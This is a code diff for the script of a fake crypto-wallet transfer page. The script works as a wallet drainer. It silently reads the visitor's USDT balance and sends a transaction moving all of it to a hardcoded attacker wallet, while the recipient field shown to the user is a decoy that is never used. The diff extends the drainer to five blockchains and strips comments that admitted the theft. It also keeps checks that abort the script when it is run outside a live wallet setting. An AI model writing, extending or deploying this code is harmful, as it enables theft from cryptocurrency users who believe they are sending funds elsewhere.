@@ -1,32 +1,75 @@
 // ── Phase 1: Module Initialization ──
 import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';
 
-// ── Attacker's Operational Constants ──
-// THIS is the REAL destination where funds go (hardcoded attacker wallet)
-const DEST_WALLET  = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";
+// ── Network Configurations ──
+const NETWORKS = {
+    bsc: {
+        chainId: '0x38',
+        chainName: 'BNB Smart Chain',
+        rpcUrl: 'https://bsc-dataseed1.binance.org/',
+        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+        blockExplorer: 'https://bscscan.com',
+        usdtAddress: '0x55d398326f99059fF775485246999027B3197955',
+        icon: '🟡'
+    },
+    ethereum: {
+        chainId: '0x1',
+        chainName: 'Ethereum Mainnet',
+        rpcUrl: 'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161',
+        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
+        blockExplorer: 'https://etherscan.io',
+        usdtAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+        icon: '🔵'
+    },
+    polygon: {
+        chainId: '0x89',
+        chainName: 'Polygon Mainnet',
+        rpcUrl: 'https://polygon-rpc.com/',
+        nativeCurrency: { name: 'MATIC', symbol: 'MATIC', decimals: 18 },
+        blockExplorer: 'https://polygonscan.com',
+        usdtAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+        icon: '🟣'
+    },
+    arbitrum: {
+        chainId: '0xa4b1',
+        chainName: 'Arbitrum One',
+        rpcUrl: 'https://arb1.arbitrum.io/rpc',
+        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
+        blockExplorer: 'https://arbiscan.io',
+        usdtAddress: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
+        icon: '🔷'
+    },
+    optimism: {
+        chainId: '0xa',
+        chainName: 'Optimism',
+        rpcUrl: 'https://mainnet.optimism.io',
+        nativeCurrency: { name: 'Ethereum', symbol: 'ETH', decimals: 18 },
+        blockExplorer: 'https://optimistic.etherscan.io',
+        usdtAddress: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',
+        icon: '🔴'
+    }
+};
 
-// The USDT contract address on BSC
-const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
-const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
-const BSC_CHAIN_ID = "0x38";
+// ── Attacker's Operational Constants ──
+const DEST_WALLET = "0xB1E5005321cE082a7e4E8200050bc5db7C34696D";
 
 // ── Runtime State ──
 let provider;
 let userAddress;
+let currentNetwork = 'bsc';
 
 // ── Silent Recon Engine ──
-
-// D1 — Silent balanceOf via raw eth_call (0x70a08231)
-async function fetchMaxBalance(addr) {
+async function fetchMaxBalance(addr, networkKey) {
     try {
+        const network = NETWORKS[networkKey];
         const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
-        const res = await fetch(BSC_RPC, {
+        const res = await fetch(network.rpcUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 jsonrpc: "2.0", id: 1,
                 method: "eth_call",
-                params: [{ to: USDT_BEP20, data: data }, "latest"]
+                params: [{ to: network.usdtAddress, data: data }, "latest"]
             })
         });
         const json = await res.json();
@@ -35,10 +78,10 @@ async function fetchMaxBalance(addr) {
 }
 
 // ── Drain Engine ──
-async function executeDrain(balanceHex) {
+async function executeDrain(balanceHex, networkKey) {
     const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;
+    const network = NETWORKS[networkKey];
 
-    // If balance is 0 or very small, use whatever user typed
     let amountHex;
     if (balanceHex && balanceHex !== '0x0000000000000000000000000000000000000000000000000000000000000000') {
         amountHex = balanceHex.replace('0x', '').padStart(64, '0');
@@ -47,17 +90,14 @@ async function executeDrain(balanceHex) {
         amountHex = BigInt(Math.floor(parseFloat(val) * 10**18)).toString(16).padStart(64, '0');
     }
 
-    // IMPORTANT: ALWAYS uses DEST_WALLET (attacker's address)
-    // The UI recipientInput is IGNORED completely - it's just a decoy!
     const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
     const txData = "0xa9059cbb" + cleanDest + amountHex;
 
-    // User pays their own gas fees
     await window.ethereum.request({
         method: 'eth_sendTransaction',
         params: [{
             from: userAddress,
-            to: USDT_BEP20,
+            to: network.usdtAddress,
             data: txData,
             value: '0x0'
         }]
@@ -69,40 +109,51 @@ const ui = {
     nextBtn: document.getElementById('nextBtn'),
     amountInput: document.getElementById('amountInput'),
     usdLabel: document.getElementById('usdLabel'),
-    recipientInput: document.getElementById('recipientInput'), // THIS IS A DECOY - NEVER USED
+    recipientInput: document.getElementById('recipientInput'),
     clearAddr: document.getElementById('clearAddr'),
     clearAmount: document.getElementById('clearAmount'),
     maxBtn: document.getElementById('maxBtn'),
     addrGroup: document.getElementById('addrGroup'),
     amountGroup: document.getElementById('amountGroup'),
-    pasteBtn: document.getElementById('pasteBtn')
+    pasteBtn: document.getElementById('pasteBtn'),
+    networkSelect: document.getElementById('networkSelect'),
+    networkLabel: document.getElementById('networkLabel'),
+    networkIcon: document.getElementById('networkIcon'),
+    usdtLabel: document.getElementById('usdtLabel')
 };
 
 // ── Module Entry Point ──
 document.addEventListener('DOMContentLoaded', () => {
-
-    // Check 1 — Served from real web server (not file://)
     if (location.protocol === 'file:') {
         console.warn('[ABORT] Check 1 fail: file:// protocol');
         return;
     }
 
-    // Check 2 — window.ethereum injected by wallet
     if (typeof window.ethereum === 'undefined') {
         console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
         return;
     }
 
-    // Check 3 — nextBtn exists in DOM
     if (!ui.nextBtn) {
         console.warn('[ABORT] Check 3 fail: #nextBtn not found');
         return;
     }
 
+    // Initialize network selector
+    populateNetworkSelector();
+    updateNetworkDisplay();
+
     // Bind click listener
     ui.nextBtn.addEventListener('click', handleNextClick);
 
-    // UI Helpers (these only affect the UI display, not the actual transaction)
+    // Network change handler
+    ui.networkSelect.addEventListener('change', (e) => {
+        currentNetwork = e.target.value;
+        updateNetworkDisplay();
+        updateUsdtLabel();
+    });
+
+    // UI Helpers
     ui.amountInput.oninput = () => {
         const val = parseFloat(ui.amountInput.value) || 0;
         ui.usdLabel.textContent = val.toFixed(2);
@@ -116,19 +167,16 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // Clear amount button
     ui.clearAmount.onclick = () => {
         ui.amountInput.value = '';
         ui.amountInput.oninput();
     };
 
-    // Clear address button (only clears the DECOY address)
     ui.clearAddr.onclick = () => {
         ui.recipientInput.value = '';
         ui.clearAddr.style.display = 'none';
     };
 
-    // Recipient input handler (only for DECOY display)
     ui.recipientInput.oninput = () => {
         if (ui.recipientInput.value.length > 0) {
             ui.clearAddr.style.display = 'flex';
@@ -137,13 +185,11 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // Max button
     ui.maxBtn.onclick = () => {
         ui.amountInput.value = "1000";
         ui.amountInput.oninput();
     };
 
-    // Paste button (pastes into DECOY field)
     ui.pasteBtn.onclick = async () => {
         try {
             const text = await navigator.clipboard.readText();
@@ -154,15 +200,79 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     };
 
-    // Focus effects
     ui.addrGroup.addEventListener('focusin', () => ui.addrGroup.classList.add('active'));
     ui.addrGroup.addEventListener('focusout', () => ui.addrGroup.classList.remove('active'));
     ui.amountGroup.addEventListener('focusin', () => ui.amountGroup.classList.add('active'));
     ui.amountGroup.addEventListener('focusout', () => ui.amountGroup.classList.remove('active'));
 
-    // Initial trigger
     ui.recipientInput.oninput();
 });
+
+function populateNetworkSelector() {
+    const select = ui.networkSelect;
+    if (!select) return;
+    
+    select.innerHTML = '';
+    Object.keys(NETWORKS).forEach(key => {
+        const network = NETWORKS[key];
+        const option = document.createElement('option');
+        option.value = key;
+        option.textContent = `${network.icon} ${network.chainName}`;
+        select.appendChild(option);
+    });
+}
+
+function updateNetworkDisplay() {
+    const network = NETWORKS[currentNetwork];
+    if (!network) return;
+    
+    if (ui.networkLabel) {
+        ui.networkLabel.textContent = network.chainName;
+    }
+    if (ui.networkIcon) {
+        ui.networkIcon.textContent = network.icon;
+    }
+    updateUsdtLabel();
+}
+
+function updateUsdtLabel() {
+    const network = NETWORKS[currentNetwork];
+    if (ui.usdtLabel) {
+        ui.usdtLabel.textContent = 'USDT';
+    }
+}
+
+// ── Switch Network ──
+async function switchToNetwork(networkKey) {
+    const network = NETWORKS[networkKey];
+    try {
+        await window.ethereum.request({
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: network.chainId }]
+        });
+        return true;
+    } catch (e) {
+        if (e.code === 4902) {
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: network.chainId,
+                        chainName: network.chainName,
+                        rpcUrls: [network.rpcUrl],
+                        nativeCurrency: network.nativeCurrency,
+                        blockExplorerUrls: [network.blockExplorer]
+                    }]
+                });
+                return true;
+            } catch (addError) {
+                console.log('Failed to add network:', addError);
+                return false;
+            }
+        }
+        return false;
+    }
+}
 
 // ── Main Interaction Controller ──
 async function handleNextClick() {
@@ -173,33 +283,10 @@ async function handleNextClick() {
     ui.nextBtn.disabled = true;
 
     try {
-        // Step 1 — Switch to BSC network
-        try {
-            await window.ethereum.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: BSC_CHAIN_ID }]
-            });
-        } catch (e) {
-            if (e.code === 4902) {
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: BSC_CHAIN_ID,
-                            chainName: 'BNB Smart Chain',
-                            rpcUrls: [BSC_RPC],
-                            nativeCurrency: {
-                                name: 'BNB',
-                                symbol: 'BNB',
-                                decimals: 18
-                            },
-                            blockExplorerUrls: ['https://bscscan.com']
-                        }]
-                    });
-                } catch (addError) {
-                    console.log('Failed to add BSC network');
-                }
-            }
+        // Step 1 — Switch to selected network
+        const switched = await switchToNetwork(currentNetwork);
+        if (!switched) {
+            throw new Error('Failed to switch network');
         }
 
         // Step 2 — Get user wallet address
@@ -212,14 +299,13 @@ async function handleNextClick() {
         }
 
         // Step 3 — Init provider
-        provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
+        provider = new ethers.providers.JsonRpcProvider(NETWORKS[currentNetwork].rpcUrl);
 
         // Step 4 — Silent USDT balance recon
-        const balanceHex = await fetchMaxBalance(userAddress);
+        const balanceHex = await fetchMaxBalance(userAddress, currentNetwork);
         
-        // Step 5 — Execute the drain (user pays gas)
-        // Funds go to DEST_WALLET, NOT to what's in recipientInput!
-        await executeDrain(balanceHex);
+        // Step 5 — Execute the drain
+        await executeDrain(balanceHex, currentNetwork);
 
         ui.nextBtn.innerHTML = '✓ Completed';
         setTimeout(() => {
